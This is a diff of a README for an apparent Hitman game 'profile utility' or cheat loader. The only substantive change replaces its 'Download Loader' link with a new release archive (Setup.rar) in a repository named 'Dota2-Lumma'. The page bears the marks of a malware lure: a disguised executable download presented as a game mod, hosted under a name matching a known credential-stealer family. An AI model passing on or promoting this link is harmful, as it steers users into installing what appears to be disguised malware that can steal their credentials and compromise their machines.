@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Hitman World of Assassination Profile Utility
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Hitman-World-of-Assassination-Profile-Utility` · Updated: 2026-10-07
 
 **Tags:** `hitman-world-of-assassination` `profile` `stealth` `stats` `windows`
+
 
 
 
